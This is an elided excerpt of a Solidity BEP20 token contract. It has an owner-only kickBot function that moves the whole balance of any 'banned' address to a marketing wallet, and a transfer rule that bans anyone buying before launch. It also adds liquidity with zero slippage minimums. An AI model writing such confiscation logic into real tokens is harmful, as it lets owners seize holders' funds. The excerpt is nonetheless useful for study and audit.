...
contract BEP20 is IBEP20, Auth {
  ...
  function kickBot(address account) external authorized() returns (bool) {
    require(_banBot[account]==true);
    _basictransfer(account,marketingwallet,_balances[account]);
    return true;
  }
  ...
  function _transferFrom(address sender,address recipient,uint256 amount) internal {
    ...
    inSwap = true;
    uint256 amountBurn = _swapthreshold.mul(burnfee).div(totalfee);
    uint256 amountTrigger = _swapthreshold.sub(amountBurn);
    ...
    uint256 marketingtransfer = beforebalance.mul(marketingfee).div(marketingfee.add(liquidityfee));
    ...
    router.addLiquidityETH{value: address(this).balance }(
    address(this),
    _balances[address(this)].sub(beforetokenbalance),
    0,
    0,
    LPfeeRecaiver,
    block.timestamp
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if( launchblock > block.timestamp && sender == pair ) {
    _banBot[recipient] = true;
    }
